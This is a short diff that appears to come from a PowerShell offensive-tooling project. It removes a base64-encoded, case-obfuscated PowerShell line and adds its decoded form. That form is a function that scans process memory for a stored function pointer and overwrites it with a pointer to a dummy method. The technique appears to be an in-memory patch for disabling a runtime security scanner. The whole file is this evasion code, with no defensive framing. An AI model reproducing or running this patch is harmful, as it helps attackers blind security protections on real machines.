@@ -1,1 +1,23 @@
-[syStEm.Text.enCODinG]::UnicoDe.geTSTRing([SYSTeM.cONVErt]::FRomBase64StriNG("ZnVuY3Rpb24gY29vbCB7CiAgICA6aW5pdGlhbGxvb3AgZm9yKCRqID0gJEluaXRpYWxTdGFydDsgJGogLWx0ICRNYXhPZmZzZXQ7ICRqICs9ICROZWdhdGl2ZU9mZnNldCl7CiAgICAgICAgW0ludFB0cl0gJE1ldGhvZFBvaW50ZXJUb1NlYXJjaCA9IFtJbnQ2NF0gJE1ldGhvZFBvaW50ZXIgLSAkagogICAgICAgICRSZWFkZWRNZW1vcnlBcnJheSA9IFtieXRlW11dOjpuZXcoJFJlYWRCeXRlcykKICAgICAgICAkQXBpUmV0dXJuID0gW0FQSXNdOjpSZWFkUHJvY2Vzc01lbW9yeSgkSGFuZGxlLCAkTWV0aG9kUG9pbnRlclRvU2VhcmNoLCAkUmVhZGVkTWVtb3J5QXJyYXksICRSZWFkQnl0ZXMsW3JlZl0kZHVtbXkpCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkUmVhZGVkTWVtb3J5QXJyYXkuTGVuZ3RoOyAkaSArPSAxKSB7CiAgICAgICAgJGJ5dGVzID0gW2J5dGVbXV0oJFJlYWRlZE1lbW9yeUFycmF5WyRpXSwgJFJlYWRlZE1lbW9yeUFycmF5WyRpICsgMV0sICRSZWFkZWRNZW1vcnlBcnJheVskaSArIDJdLCAkUmVhZGVkTWVtb3J5QXJyYXlbJGkgKyAzXSwgJFJlYWRlZE1lbW9yeUFycmF5WyRpICsgNF0sICRSZWFkZWRNZW1vcnlBcnJheVskaSArIDVdLCAkUmVhZGVkTWVtb3J5QXJyYXlbJGkgKyA2XSwgJFJlYWRlZE1lbW9yeUFycmF5WyRpICsgN10pCiAgICAgICAgW0ludFB0cl0gJFBvaW50ZXJUb0NvbXBhcmUgPSBbYml0Y29udmVydGVyXTo6VG9JbnQ2NCgkYnl0ZXMsMCkKICAgICAgICBpZiAoJFBvaW50ZXJUb0NvbXBhcmUgLWVxICRmdW5jQWRkcikgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJGb3VuZCBAICQoJGopIDogJCgkaSkhIgogICAgICAgICAgICBbSW50UHRyXSAkTWVtb3J5VG9QYXRjaCA9IFtJbnQ2NF0gJE1ldGhvZFBvaW50ZXJUb1NlYXJjaCArICRpCiAgICAgICAgICAgIGJyZWFrIGluaXRpYWxsb29wCiAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFtJbnRQdHJdICREdW1teVBvaW50ZXIgPSBbQVBJc10uR2V0TWV0aG9kKCdEdW1teScpLk1ldGhvZEhhbmRsZS5HZXRGdW5jdGlvblBvaW50ZXIoKQogICAgJGJ1ZiA9IFtJbnRQdHJbXV0gKCREdW1teVBvaW50ZXIpCiAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRidWYsIDAsICRNZW1vcnlUb1BhdGNoLCAxKQoKICAgICRGaW5pc2hEYXRlPUdldC1EYXRlOwogICAgJFRpbWVFbGFwc2VkID0gKCRGaW5pc2hEYXRlIC0gJEluaXRpYWxEYXRlKS5Ub3RhbFNlY29uZHM7CiAgICBXcml0ZS1Ib3N0ICIkVGltZUVsYXBzZWQgc2Vjb25kcyIKfQ=="))
+function cool {
+    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
+        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
+        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
+        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
+        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
+        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
+        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
+        if ($PointerToCompare -eq $funcAddr) {
+            Write-Host "Found @ $($j) : $($i)!"
+            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
+            break initialloop
+        }
+        }
+    }
+    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
+    $buf = [IntPtr[]] ($DummyPointer)
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
+
+    $FinishDate=Get-Date;
+    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
+    Write-Host "$TimeElapsed seconds"
+}
